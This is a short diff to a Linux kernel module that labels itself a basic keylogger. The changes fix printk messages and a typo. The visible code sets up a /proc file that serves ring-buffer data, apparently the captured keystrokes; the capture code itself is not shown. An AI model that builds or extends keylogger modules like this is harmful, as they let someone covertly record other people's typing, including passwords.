@@ -60,7 +60,7 @@ int init_proc_file()
         proc_entry = create_proc_entry(proc_filename, 0644, NULL );
         if(proc_entry == NULL)
         {
-                printk(KERN_INFO "failed to create proc entry %s", proc_filename);
+                printk(KERN_INFO "failed to create proc entry %s\n", proc_filename);
                 return -ENOMEM;
         }
         proc_entry->read_proc = read_proc_file;
@@ -89,7 +89,7 @@ int read_proc_file(char *buffer,char **buffer_location,off_t offset, int buffer_
 	char* ringBufferData = get_ring_elements();
 	int buffer_size = RING_BUFFER_SIZE;
 	
-        printk(KERN_INFO "procfile_read (/proc/%s) called\n", proc_filename);
+        printk(KERN_INFO "read_proc_file (/proc/%s) called\n", proc_filename);
 
         if (offset > 0) {
                 /* we have finished to read, return 0 */
@@ -124,4 +124,4 @@ module_exit(klogger_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Carlos Andre");
-MODULE_DESCRIPTION("A basic keylogger implemention.");
+MODULE_DESCRIPTION("A basic keylogger implementation.");
